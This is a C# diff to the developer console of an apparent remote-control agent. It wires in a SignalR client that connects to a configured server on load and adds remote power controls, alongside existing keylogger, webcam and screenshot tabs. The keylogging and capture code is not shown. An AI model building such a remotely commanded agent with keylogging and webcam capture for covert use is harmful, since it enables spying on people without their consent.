@@ -17,33 +17,44 @@ public class AgentDebugForm : Form
     // Services
     private readonly WebCamService _webCamService;
     private readonly KeyLoggerService _keyLoggerService;
+    private readonly SignalRClientService _signalRService;
+    private readonly Microsoft.Extensions.Configuration.IConfiguration _configuration;
 
     // Dashboard
-    private Label _lblCpu = null!, _lblRam = null!, _lblUptime = null!, _lblProcessCount = null!;
-    private System.Windows.Forms.Timer _sysInfoTimer = null!;
+    private Label _lblCpu, _lblRam, _lblUptime, _lblProcessCount;
+    private System.Windows.Forms.Timer _sysInfoTimer;
 
     // Processes
-    private ListView _lvProcesses = null!;
-    private TextBox _txtStartProc = null!;
+    private ListView _lvProcesses;
+    private TextBox _txtStartProc;
 
     // Screenshot
-    private PictureBox _pbScreenshot = null!;
-    private Label _lblScreenshotInfo = null!;
+    private PictureBox _pbScreenshot;
+    private Label _lblScreenshotInfo;
 
     // Webcam
-    private PictureBox _pbWebcam = null!;
-    private Button _btnStartCam = null!, _btnStopCam = null!;
+    private PictureBox _pbWebcam;
+    private Button _btnStartCam, _btnStopCam;
 
     // KeyLogs
-    private TextBox _txtKeyLogs = null!;
-    private Button _btnStartKeyLog = null!, _btnStopKeyLog = null!;
-    private System.Windows.Forms.Timer _logTimer = null!;
+    private TextBox _txtKeyLogs;
+    private Button _btnStartKeyLog, _btnStopKeyLog;
+    private System.Windows.Forms.Timer _logTimer;
 
-    public AgentDebugForm()
+    public AgentDebugForm(Microsoft.Extensions.Configuration.IConfiguration configuration)
     {
+        _configuration = configuration;
         _commandHandler = new CommandHandler();
         _webCamService = new WebCamService();
         _keyLoggerService = new KeyLoggerService();
+        
+        // Init SignalR
+        _signalRService = new SignalRClientService(_commandHandler, _configuration);
+        _signalRService.OnStatusChanged += (msg) => this.Invoke(() => UpdateStatus(msg));
+        _signalRService.OnConnectionStateChanged += (state) => this.Invoke(() => 
+        {
+            this.Text = $"RemoteControl Agent - Developer Console [{state}]";
+        });
 
         // Form Setup - Fixed size behavior
         this.Text = "RemoteControl Agent - Developer Console";
@@ -55,6 +66,7 @@ public class AgentDebugForm : Form
         this.StartPosition = FormStartPosition.CenterScreen;
         this.Font = new Font("Segoe UI", 9F);
         this.FormClosing += AgentDebugForm_FormClosing;
+        this.Load += async (s, e) => await _signalRService.ConnectAsync(); // Connect on Load
         this.AutoScaleMode = AutoScaleMode.Dpi;
         this.DoubleBuffered = true;
 
@@ -92,11 +104,70 @@ public class AgentDebugForm : Form
         InitScreenshotTab();
         InitWebcamTab();
         InitKeyLoggerTab();
-        
+        InitPowerTab(); // Add Power Tab
+
         // Disable TabStop for all controls to allow KeyLogger testing
         DisableTabStop(this);
     }
     
+    // =================================================================================
+    // TAB 6: POWER CONTROL
+    // =================================================================================
+    private void InitPowerTab()
+    {
+        var tab = new TabPage("Power") { Padding = new Padding(20) };
+        var layout = new FlowLayoutPanel 
+        { 
+            Dock = DockStyle.Fill, 
+            FlowDirection = FlowDirection.TopDown,
+            WrapContents = false,
+            AutoScroll = true
+        };
+
+        var lblWarning = new Label 
+        { 
+            Text = "⚠️ WARNING: These actions will affect the host machine immediately!",
+            ForeColor = Color.Red,
+            AutoSize = true,
+            Font = new Font("Segoe UI", 10F, FontStyle.Bold),
+            Margin = new Padding(0, 0, 0, 20)
+        };
+
+        layout.Controls.Add(lblWarning);
+        layout.Controls.Add(CreatePowerBtn("🔒 Lock Workstation", Color.Orange, CommandType.Lock));
+        layout.Controls.Add(CreatePowerBtn("💤 Sleep / Suspend", Color.RoyalBlue, CommandType.Sleep));
+        layout.Controls.Add(CreatePowerBtn("🔁 Restart Computer", Color.DarkOrchid, CommandType.Restart));
+        layout.Controls.Add(CreatePowerBtn("🛑 Shutdown Computer", Color.Crimson, CommandType.Shutdown));
+
+        tab.Controls.Add(layout);
+        _tabControl.TabPages.Add(tab);
+    }
+    
+    private Button CreatePowerBtn(string text, Color color, CommandType type)
+    {
+        var btn = new Button
+        {
+            Text = text,
+            Size = new Size(250, 45),
+            BackColor = color,
+            ForeColor = Color.White,
+            FlatStyle = FlatStyle.Flat,
+            Cursor = Cursors.Hand,
+            Margin = new Padding(5),
+            Font = new Font("Segoe UI", 11F)
+        };
+        btn.Click += (s, e) => 
+        {
+            if (MessageBox.Show($"Are you sure you want to {text}?", "Confirm Power Action", 
+                MessageBoxButtons.YesNo, MessageBoxIcon.Warning) == DialogResult.Yes)
+            {
+                var result = _commandHandler.HandleCommand(new CommandRequest { Type = type });
+                UpdateStatus(result.Message);
+            }
+        };
+        return btn;
+    }
+
     private void DisableTabStop(Control parent)
     {
         foreach (Control c in parent.Controls)
